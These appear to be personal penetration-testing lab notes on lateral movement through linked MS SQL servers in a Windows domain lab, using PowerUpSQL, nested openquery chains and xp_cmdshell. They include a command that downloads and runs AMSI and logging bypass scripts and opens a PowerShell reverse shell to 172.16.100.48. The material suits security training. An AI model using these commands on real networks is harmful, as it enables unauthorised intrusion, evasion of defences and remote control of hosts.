MS SQL servers are generally deployed in plenty in a Windows domain

SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.

#### [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

```powershell
 . .\PowerUpSQL-master\PowerUpSQL.ps1
```
###### Discovery (SPN Scanning) - find all mssql SPNs (default for mssql servers)
```powershell
Get-SQLInstanceDomain
```

###### Check Accessibility 
```powershell
Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

###### Gather Information
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

>**Note:** Review `ServiceName`, `AuthenticationMode`, `IsSysadmin` and `ActiveSessions`
#### Database Links
A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures

> **Note**: Database links work even across forest trusts. **Forest security boundaries can't even stop it**

[^1]![[Pasted image 20250521200749.png]]
###### Search for Database Links
```powershell
Get-SQLServerLink -Instance dcorp-mssql -Verbose
```

![[Pasted image 20250521201158.png]]


> [!NOTE] **NOTE**
> Connect to host using the `HeidiSQL` client


 Manual
```sql
select * from master..sysservers
```

###### Enumerating Database Links 
Jesus lol
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```

![[Pasted image 20250521201531.png]]

Manual - The `Openquery()` function can be used to run queries on a linked database
```sql
select * from openquery("dcorp-sql1",'select * from master..sysservers')
```

Manual - `Openquery()` queries can be chained to access links within links (nested
links)
```sql
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
```

###### Executing Commands

> [!NOTE] **Note**
>  If `rpcout` is enabled (disabled by default), `xp_cmdshell` can be enabled like so:
> ```sql
> EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"

Run commands using crawler
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
```

Reverseshell
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.48/sbloggingbypass.txt); iex (iwr -UseBasicParsing http://172.16.100.48/amsibypass.txt); iex (iwr http://172.16.100.48/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.48 -Port 443"''' -QueryTarget eu-sql35
```

Manual
```sql
select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```


